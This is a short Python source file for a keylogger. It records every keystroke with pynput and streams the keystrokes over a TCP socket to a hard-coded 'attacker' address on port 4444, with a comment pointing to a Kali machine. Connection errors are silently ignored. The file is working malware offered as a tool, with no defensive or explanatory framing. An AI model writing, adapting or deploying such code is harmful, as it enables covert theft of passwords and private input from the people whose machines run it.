import pynput.keyboard
import socket

class Keylogger:
    def __init__(self, attacker_ip, port):
        self.log = ""
        self.attacker_ip = attacker_ip
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.sock.connect((self.attacker_ip, self.port))
        except Exception:
            pass  # Silently ignore connection failure

    def append_to_log(self, key_strike):
        self.log += key_strike
        try:
            self.sock.sendall((self.log + "\n").encode("utf-8"))
            self.log = ""
        except:
            self.sock.close()

    def evaluate_keys(self, key):
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == key.space:
                key_str = " "
            elif key == key.enter:
                key_str = "\n"
            else:
                key_str = f" [{key}] "
        self.append_to_log(key_str)

    def start(self):
        with pynput.keyboard.Listener(on_press=self.evaluate_keys) as listener:
            listener.join()

if __name__ == "__main__":
    attacker_ip = "192.168.72.135"  # Replace with your Kali IP
    port = 4444
    Keylogger(attacker_ip, port).start()
